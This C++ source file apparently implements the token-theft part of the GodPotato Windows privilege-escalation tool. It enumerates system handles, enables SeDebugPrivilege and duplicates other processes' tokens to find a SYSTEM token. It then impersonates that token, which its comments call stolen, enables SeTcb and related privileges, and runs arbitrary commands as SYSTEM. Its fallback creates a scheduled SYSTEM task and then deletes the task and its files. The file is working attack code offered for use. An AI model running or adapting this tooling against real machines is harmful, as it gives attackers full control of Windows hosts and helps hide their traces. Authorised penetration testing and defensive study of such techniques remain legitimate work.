#include "token.h"

#include <sddl.h>

#include <algorithm>
#include <cstring>
#include <unordered_map>

namespace {

constexpr DWORD kTokenAccess = TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY |
                               TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID |
                               TOKEN_ADJUST_PRIVILEGES | TOKEN_IMPERSONATE;

// ---- SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX (Information Class 64) -------------

struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
};

struct SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
};

typedef LONG(WINAPI* NtQuerySystemInformationFn)(ULONG, PVOID, ULONG, PULONG);

constexpr ULONG kSystemExtendedHandleInformation = 64;
constexpr LONG kStatusInfoLengthMismatch = static_cast<LONG>(0xC0000004);
constexpr LONG kStatusBufferOverflow = static_cast<LONG>(0x80000005);

bool ListSystemHandles(std::vector<SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>& out) {
    static NtQuerySystemInformationFn query = reinterpret_cast<NtQuerySystemInformationFn>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation"));
    if (!query) return false;

    ULONG size = 1u << 20;
    std::vector<uint8_t> buffer;
    LONG status = 0;
    for (;;) {
        buffer.resize(size);
        ULONG returned = 0;
        status = query(kSystemExtendedHandleInformation, buffer.data(), size, &returned);
        if ((status == kStatusInfoLengthMismatch || status == kStatusBufferOverflow) && size < (256u << 20)) {
            size *= 2;
            continue;
        }
        break;
    }
    if (status < 0) return false;

    auto* info = reinterpret_cast<SYSTEM_HANDLE_INFORMATION_EX*>(buffer.data());
    if (info->NumberOfHandles > (buffer.size() - sizeof(ULONG_PTR) * 2) / sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)) {
        return false;
    }
    out.assign(info->Handles, info->Handles + info->NumberOfHandles);
    return true;
}

bool GetTokenInfo(HANDLE token, TOKEN_INFORMATION_CLASS infoClass, std::vector<uint8_t>& buffer) {
    DWORD length = 0;
    GetTokenInformation(token, infoClass, nullptr, 0, &length);
    if (length == 0) return false;
    buffer.resize(length);
    if (!GetTokenInformation(token, infoClass, buffer.data(), length, &length)) return false;
    buffer.resize(length);
    return true;
}

bool QuerySidString(HANDLE token, std::wstring& sidString) {
    std::vector<uint8_t> buffer;
    if (!GetTokenInfo(token, TokenUser, buffer)) return false;
    auto* user = reinterpret_cast<TOKEN_USER*>(buffer.data());
    LPWSTR text = nullptr;
    if (!ConvertSidToStringSidW(user->User.Sid, &text)) return false;
    sidString.assign(text);
    LocalFree(text);
    return true;
}

bool QueryIntegrity(HANDLE token, DWORD& integrity) {
    std::vector<uint8_t> buffer;
    if (!GetTokenInfo(token, TokenIntegrityLevel, buffer)) return false;
    auto* label = reinterpret_cast<TOKEN_MANDATORY_LABEL*>(buffer.data());
    if (!label->Label.Sid) return false;
    UCHAR count = *GetSidSubAuthorityCount(label->Label.Sid);
    if (count == 0) return false;
    DWORD* rid = GetSidSubAuthority(label->Label.Sid, static_cast<DWORD>(count - 1));
    if (!rid) return false;
    integrity = *rid;
    return true;
}

bool QueryImpersonationLevel(HANDLE token, SECURITY_IMPERSONATION_LEVEL& level) {
    std::vector<uint8_t> buffer;
    if (!GetTokenInfo(token, TokenImpersonationLevel, buffer) || buffer.size() < sizeof(DWORD)) {
        return false;
    }
    DWORD raw = *reinterpret_cast<DWORD*>(buffer.data());
    if (raw > static_cast<DWORD>(SecurityDelegation)) return false;
    level = static_cast<SECURITY_IMPERSONATION_LEVEL>(raw);
    return true;
}

bool IsTokenPrimary(HANDLE token) {
    std::vector<uint8_t> buffer;
    if (!GetTokenInfo(token, TokenType, buffer) || buffer.size() < sizeof(DWORD)) return false;
    return *reinterpret_cast<DWORD*>(buffer.data()) == TokenPrimary;
}

// True when the token is SYSTEM, at System integrity, fully impersonable and
// not a restricted token (the checks GodPotato performs on each candidate).
bool IsUsableSystemToken(HANDLE token) {
    std::wstring sid;
    if (!QuerySidString(token, sid) || sid != L"S-1-5-18") return false;

    DWORD integrity = 0;
    if (!QueryIntegrity(token, integrity) || integrity < SECURITY_MANDATORY_SYSTEM_RID) return false;

    SECURITY_IMPERSONATION_LEVEL level = SecurityImpersonation;
    if (!IsTokenPrimary(token)) {
        if (!QueryImpersonationLevel(token, level) || level < SecurityImpersonation) return false;
    }
    if (IsTokenRestricted(token)) return false;
    return true;
}

HANDLE DuplicateAsPrimary(HANDLE token) {
    HANDLE primary = nullptr;
    if (!DuplicateTokenEx(token, kTokenAccess, nullptr, SecurityImpersonation, TokenPrimary, &primary)) {
        return nullptr;
    }
    return primary;
}

HANDLE TryPromote(HANDLE token) {
    if (!IsUsableSystemToken(token)) return nullptr;
    return DuplicateAsPrimary(token);
}

void EnablePrivilegeOnToken(HANDLE token, DWORD luidLowPart) {
    if (!token) return;
    TOKEN_PRIVILEGES privileges{};
    privileges.PrivilegeCount = 1;
    privileges.Privileges[0].Luid.LowPart = luidLowPart;
    privileges.Privileges[0].Luid.HighPart = 0;
    privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    SetLastError(ERROR_SUCCESS);
    AdjustTokenPrivileges(token, FALSE, &privileges, sizeof(privileges), nullptr, nullptr);
}

// ObjectTypeIndex reserved for Token objects, discovered by locating a token
// handle that belongs to this process (SharpToken.getTokenType).
int GetTokenObjectTypeIndex(HANDLE hintToken) {
    HANDLE token = hintToken;
    bool own = false;
    if (!token) {
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) return -1;
        own = true;
    }

    std::vector<SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX> handles;
    int result = -1;
    if (ListSystemHandles(handles)) {
        ULONG_PTR selfPid = static_cast<ULONG_PTR>(GetCurrentProcessId());
        ULONG_PTR wanted = reinterpret_cast<ULONG_PTR>(token);
        for (const auto& entry : handles) {
            if (entry.UniqueProcessId == selfPid && entry.HandleValue == wanted) {
                result = entry.ObjectTypeIndex;
                break;
            }
        }
    }
    if (own) CloseHandle(token);
    return result;
}

void EnableDebugPrivilege() {
    HANDLE token = nullptr;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, TRUE, &token)) {
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) return;
    }
    EnablePrivilegeOnToken(token, 20);  // SeDebugPrivilege
    CloseHandle(token);
}

bool OutputFileHasData(const std::wstring& path) {
    WIN32_FILE_ATTRIBUTE_DATA data{};
    if (!GetFileAttributesExW(path.c_str(), GetFileExInfoStandard, &data)) return false;
    return data.nFileSizeHigh != 0 || data.nFileSizeLow != 0;
}

DWORD RunAndWait(const std::wstring& commandLine, DWORD timeoutMs) {
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    std::wstring cmd = commandLine;

    if (!CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, FALSE,
                        CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, nullptr, nullptr, &si, &pi)) {
        return GetLastError();
    }
    WaitForSingleObject(pi.hProcess, timeoutMs);
    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return exitCode;
}

bool WriteAnsiFile(const std::wstring& path, const std::string& content) {
    HANDLE file = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                              FILE_ATTRIBUTE_NORMAL, nullptr);
    if (file == INVALID_HANDLE_VALUE) return false;
    DWORD written = 0;
    bool ok = WriteFile(file, content.data(), static_cast<DWORD>(content.size()), &written, nullptr) != FALSE;
    CloseHandle(file);
    return ok;
}

}  // namespace

bool TokenIsSystem(HANDLE token) {
    if (!token) return false;
    std::wstring sid;
    return QuerySidString(token, sid) && sid == L"S-1-5-18";
}

HANDLE DuplicateSystemTokenAsPrimary(HANDLE token) {
    if (!token) return nullptr;
    return TryPromote(token);
}

bool TokenGetImpersonationLevel(HANDLE token, SECURITY_IMPERSONATION_LEVEL& level) {
    return QueryImpersonationLevel(token, level);
}

bool TokenUserName(HANDLE token, std::wstring& name) {
    std::vector<uint8_t> buffer;
    if (!GetTokenInfo(token, TokenUser, buffer)) return false;
    auto* user = reinterpret_cast<TOKEN_USER*>(buffer.data());

    wchar_t account[256] = {};
    wchar_t domain[256] = {};
    DWORD accountLen = _countof(account);
    DWORD domainLen = _countof(domain);
    SID_NAME_USE use = SidTypeUnknown;
    if (!LookupAccountSidW(nullptr, user->User.Sid, account, &accountLen, domain, &domainLen, &use)) {
        return false;
    }
    name = domain;
    if (!name.empty()) name += L"\\";
    name += account;
    return true;
}

HANDLE FindSystemToken(HANDLE hintToken) {
    EnableDebugPrivilege();

    int tokenType = GetTokenObjectTypeIndex(hintToken);
    if (tokenType < 0) {
        gpLog("[!] Could not determine token object type index, using handle scan only");
    }

    std::vector<SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX> handles;
    if (!ListSystemHandles(handles)) {
        gpLog("[!] NtQuerySystemInformation(SystemExtendedHandleInformation) failed");
        return nullptr;
    }

    HANDLE self = GetCurrentProcess();
    std::unordered_map<DWORD, HANDLE> processes;
    std::unordered_map<DWORD, bool> primaryTried;
    HANDLE found = nullptr;

    for (const auto& entry : handles) {
        DWORD pid = static_cast<DWORD>(entry.UniqueProcessId);
        if (pid == 0 || pid == 4) continue;

        HANDLE process = nullptr;
        auto cached = processes.find(pid);
        if (cached == processes.end()) {
            process = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
            processes.emplace(pid, process);
        } else {
            process = cached->second;
        }
        if (!process) {
            primaryTried[pid] = true;
            continue;
        }

        // Primary token of the process (covers most SYSTEM services).
        if (!primaryTried[pid]) {
            primaryTried[pid] = true;
            HANDLE processToken = nullptr;
            if (OpenProcessToken(process, kTokenAccess, &processToken)) {
                found = TryPromote(processToken);
                if (found) {
                    std::wstring user;
                    if (TokenUserName(found, user)) {
                        gpLog("[+] PID %lu token duplicated (%ls)", pid, user.c_str());
                    }
                    CloseHandle(processToken);
                    break;
                }
                CloseHandle(processToken);
            }
        }

        if (tokenType < 0 || entry.ObjectTypeIndex != static_cast<USHORT>(tokenType)) continue;
        // Known to stall sometimes; SharpToken skips this access mask too.
        if (entry.GrantedAccess == 0x0012019f) continue;

        HANDLE duplicate = nullptr;
        if (!DuplicateHandle(process, reinterpret_cast<HANDLE>(entry.HandleValue), self, &duplicate,
                             kTokenAccess, FALSE, 0)) {
            continue;
        }
        found = TryPromote(duplicate);
        if (found) {
            std::wstring user;
            if (TokenUserName(found, user)) {
                gpLog("[+] PID %lu token handle duplicated (%ls)", pid, user.c_str());
            }
        }
        CloseHandle(duplicate);
        if (found) break;
    }

    for (auto& pair : processes) {
        if (pair.second) CloseHandle(pair.second);
    }
    return found;
}

void CreateProcessReadOut(HANDLE token, const std::wstring& cmdLine) {
    if (!token) return;

    HANDLE primary = IsTokenPrimary(token) ? token : DuplicateAsPrimary(token);
    if (!primary) {
        gpLog("[!] Cannot obtain a primary token, Win32Error:%lu", GetLastError());
        return;
    }

    // Move the token into our session so cross-session process creation works.
    DWORD sessionId = 0;
    if (ProcessIdToSessionId(GetCurrentProcessId(), &sessionId)) {
        SetTokenInformation(primary, TokenSessionId, &sessionId, sizeof(sessionId));
    }

    // Impersonating the stolen token makes CreateProcessAsUser pass its
    // privilege check even when our own account lacks SeAssignPrimaryToken.
    bool impersonating = ImpersonateLoggedOnUser(primary) != FALSE;
    HANDLE privilegeToken = nullptr;
    if (impersonating) {
        if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, TRUE, &privilegeToken)) {
            privilegeToken = primary;
        }
    } else {
        privilegeToken = primary;
    }
    // Numeric LUIDs: LookupPrivilegeValue can fail while impersonating.
    EnablePrivilegeOnToken(privilegeToken, 3);   // SeAssignPrimaryTokenPrivilege
    EnablePrivilegeOnToken(privilegeToken, 5);   // SeIncreaseQuotaPrivilege
    EnablePrivilegeOnToken(privilegeToken, 7);   // SeTcbPrivilege
    EnablePrivilegeOnToken(privilegeToken, 20);  // SeDebugPrivilege
    EnablePrivilegeOnToken(privilegeToken, 29);  // SeImpersonatePrivilege
    if (privilegeToken != primary) CloseHandle(privilegeToken);

    HANDLE readPipe = nullptr;
    HANDLE writePipe = nullptr;
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    if (!CreatePipe(&readPipe, &writePipe, &sa, 0)) {
        gpLog("[!] CreatePipe failed, Win32Error:%lu", GetLastError());
        if (impersonating) RevertToSelf();
        if (primary != token) CloseHandle(primary);
        return;
    }
    SetHandleInformation(readPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = nullptr;
    si.hStdOutput = writePipe;
    si.hStdError = writePipe;

    PROCESS_INFORMATION pi{};
    std::wstring mutableCommand = cmdLine;
    BOOL created = CreateProcessAsUserW(primary, nullptr, mutableCommand.data(), nullptr, nullptr, TRUE,
                                        CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, nullptr, nullptr, &si, &pi);
    DWORD createError = created ? ERROR_SUCCESS : GetLastError();
    if (!created) {
        SetLastError(ERROR_SUCCESS);
        created = CreateProcessWithTokenW(primary, 0, nullptr, mutableCommand.data(),
                                          CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, nullptr, nullptr, &si, &pi);
        createError = created ? ERROR_SUCCESS : GetLastError();
    }

    // Close our copy of the write end so the read end sees EOF when the child exits.
    CloseHandle(writePipe);
    writePipe = nullptr;

    DWORD exitCode = 0;
    size_t totalBytes = 0;
    if (created) {
        gpLog("[*] process start with pid %lu", pi.dwProcessId);
        char buffer[4096];
        DWORD bytesRead = 0;
        while (ReadFile(readPipe, buffer, sizeof(buffer), &bytesRead, nullptr) && bytesRead > 0) {
            fwrite(buffer, 1, bytesRead, stdout);
            fflush(stdout);
            totalBytes += bytesRead;
        }
        WaitForSingleObject(pi.hProcess, 60000);
        GetExitCodeProcess(pi.hProcess, &exitCode);
        gpLog("[*] process exit code 0x%lx", exitCode);
    } else {
        gpLog("[!] Cannot create process Win32Error:%lu", createError);
    }

    CloseHandle(readPipe);
    if (created) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    if (primary != token) CloseHandle(primary);

    bool childInitFailure = created && totalBytes == 0 &&
                            (exitCode == 0xC0000142 || exitCode == 0xC0000135 ||
                             exitCode == 0xC0000139 || exitCode == 0xC000007B);
    if (!created || childInitFailure) {
        if (TokenIsSystem(token)) {
            gpLog("[*] Falling back to Task Scheduler (SYSTEM)");
            RunAsSystemViaTask(cmdLine);
        } else if (!created) {
            gpLog("[!] Token is not SYSTEM, cannot use the Task Scheduler fallback");
        }
    }

    if (impersonating) RevertToSelf();
}

bool RunAsSystemViaTask(const std::wstring& cmdLine) {
    wchar_t tempPath[MAX_PATH] = {};
    if (GetTempPathW(MAX_PATH, tempPath) == 0) return false;
    std::wstring baseDir = tempPath;
    if (baseDir.find(L' ') != std::wstring::npos) {
        baseDir = L"C:\\Windows\\Temp\\";
    }
    if (!baseDir.empty() && baseDir.back() != L'\\') baseDir += L'\\';

    wchar_t suffix[64] = {};
    swprintf_s(suffix, L"gp_%lu_%llu", GetCurrentProcessId(),
               static_cast<unsigned long long>(GetTickCount64()));

    std::wstring batPath = baseDir + suffix + L".bat";
    std::wstring outPath = baseDir + suffix + L".txt";
    std::wstring taskName = std::wstring(L"GodPotato_") + suffix;

    std::wstring content = L"@echo off\r\n";
    content += cmdLine;
    content += L" > \"";
    content += outPath;
    content += L"\" 2>&1\r\n";

    if (!WriteAnsiFile(batPath, gpWideToAnsi(content))) {
        gpLog("[!] Cannot write task script %ls", batPath.c_str());
        return false;
    }

    std::wstring create = L"schtasks.exe /create /tn \"" + taskName + L"\" /tr \"cmd /d /c " +
                          batPath + L"\" /sc once /st 00:00 /ru SYSTEM /f";
    DWORD code = RunAndWait(create, 15000);
    if (code != 0) {
        gpLog("[!] schtasks /create failed, exit code %lu", code);
        DeleteFileW(batPath.c_str());
        return false;
    }

    RunAndWait(L"schtasks.exe /run /tn \"" + taskName + L"\"", 15000);

    for (int i = 0; i < 40; ++i) {
        if (OutputFileHasData(outPath)) break;
        Sleep(250);
    }

    bool ok = false;
    HANDLE outFile = CreateFileW(outPath.c_str(), GENERIC_READ,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING,
                                 FILE_ATTRIBUTE_NORMAL, nullptr);
    if (outFile != INVALID_HANDLE_VALUE) {
        char buffer[4096];
        DWORD bytesRead = 0;
        while (ReadFile(outFile, buffer, sizeof(buffer), &bytesRead, nullptr) && bytesRead > 0) {
            fwrite(buffer, 1, bytesRead, stdout);
            fflush(stdout);
            ok = true;
        }
        CloseHandle(outFile);
    }
    if (!ok) gpLog("[!] Task output was empty");

    RunAndWait(L"schtasks.exe /delete /tn \"" + taskName + L"\" /f", 15000);
    DeleteFileW(batPath.c_str());
    DeleteFileW(outPath.c_str());
    return ok;
}
